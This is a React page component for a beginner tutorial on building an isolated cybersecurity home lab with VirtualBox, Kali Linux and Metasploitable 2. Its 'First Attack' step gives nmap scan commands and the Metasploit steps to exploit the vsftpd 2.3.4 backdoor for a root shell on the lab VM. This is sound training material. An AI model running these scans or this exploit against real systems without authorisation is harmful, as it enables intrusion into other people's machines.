import GuideLayout from '@/components/GuideLayout';
export default function HomeLabPage() {
  return (
    <GuideLayout
      title="How to Set Up a Cybersecurity Home Lab (Free, Step by Step)"
      description="Build a complete cybersecurity home lab using VirtualBox, Kali Linux, and Metasploitable. Fully free setup with network configuration and first attack guide."
      timeToRead="30 min read" lastUpdated="September 2026"
      tags={['Home Lab','VirtualBox','Kali Linux','Metasploitable','Beginner']}
      tools={[{name:'Port Scanner',url:'/tools/port-scanner'},{name:'Speed Test',url:'/tools/network/speed-test'}]}
      relatedGuides={[{title:'Kali Linux Pentesting',url:'/guides/kali-linux-pentesting-tutorial'},{title:'Nmap Scanning Tutorial',url:'/guides/nmap-scanning-tutorial'},{title:'Wireshark Analysis',url:'/guides/wireshark-packet-analysis'}]}
      headings={[{id:'overview',label:'What You Will Build'},{id:'download',label:'Download VMs'},{id:'setup',label:'VirtualBox Setup'},{id:'network',label:'Network Config'},{id:'first-attack',label:'First Attack'},{id:'more',label:'More Practice VMs'}]}
    >
      <h2 id="overview">What You Will Build</h2>
      <p>A local isolated network with two VMs:</p>
      <ul>
        <li><strong>Kali Linux</strong> — Your attacker machine (comes with Nmap, Metasploit, Wireshark, etc.)</li>
        <li><strong>Metasploitable 2</strong> — Intentionally vulnerable Linux target for practicing attacks legally</li>
      </ul>
      <p>Both VMs connect via a Host-Only network (192.168.56.x). No traffic leaves your computer.</p>

      <h2 id="download">Step 1: Download Required Software</h2>
      <ul>
        <li><a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="noopener noreferrer">VirtualBox</a> — Free hypervisor (Windows/macOS/Linux)</li>
        <li><a href="https://www.kali.org/get-kali/#kali-virtual-machines" target="_blank" rel="noopener noreferrer">Kali Linux VirtualBox OVA</a> — Pre-built, ready to import</li>
        <li><a href="https://sourceforge.net/projects/metasploitable/" target="_blank" rel="noopener noreferrer">Metasploitable 2</a> — Vulnerable target VM</li>
      </ul>

      <h2 id="setup">Step 2: VirtualBox Setup</h2>
      <pre><code>{`# Install VirtualBox (Ubuntu/Debian)
sudo apt install virtualbox

# Import Kali OVA (or use the GUI: File → Import Appliance)
VBoxManage import kali-linux-2024.ova

# Import Metasploitable
VBoxManage import metasploitable2.ova`}</code></pre>

      <h2 id="network">Step 3: Configure Host-Only Network</h2>
      <pre><code>{`# Create a Host-Only network (or use GUI: VirtualBox → Preferences → Network)
VBoxManage hostonlyif add
# Default IP: 192.168.56.1 (your host machine)

# Set both VMs to use Host-Only Adapter:
# VM Settings → Network → Adapter 1 → Host-only Adapter

# Start VMs, then verify connectivity
# On Kali: ping 192.168.56.10   (Metasploitable IP)
# On Metasploitable: ping 192.168.56.1`}</code></pre>

      <h2 id="first-attack">Step 4: Your First Attack</h2>
      <pre><code>{`# From Kali — scan Metasploitable
nmap -sV -sC 192.168.56.10

# You'll see many open services:
# 21/tcp  open  ftp      vsftpd 2.3.4  (backdoored!)
# 22/tcp  open  ssh
# 80/tcp  open  http     Apache 2.2.8
# 3306/tcp open  mysql
# 5432/tcp open  postgresql

# Exploit the vsftpd 2.3.4 backdoor with Metasploit:
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.10
exploit
# You get a root shell!

# Verify with our online scanner (for external IPs only):
# https://zentriontechnologies.com/tools/port-scanner`}</code></pre>

      <h2 id="more">More Free Vulnerable VMs</h2>
      <ul>
        <li><a href="https://www.vulnhub.com/" target="_blank" rel="noopener noreferrer">VulnHub</a> — 600+ vulnerable VMs, all free</li>
        <li><a href="https://github.com/digininja/DVWA" target="_blank" rel="noopener noreferrer">DVWA</a> — Web app vulnerability practice</li>
        <li><a href="https://tryhackme.com/" target="_blank" rel="noopener noreferrer">TryHackMe</a> — Browser-based, no VM needed</li>
        <li><a href="https://github.com/0xrajneesh/Wireshark-Home-Lab" target="_blank" rel="noopener noreferrer">Wireshark Home Lab</a> — Network analysis exercises</li>
      </ul>
    </GuideLayout>
  );
}
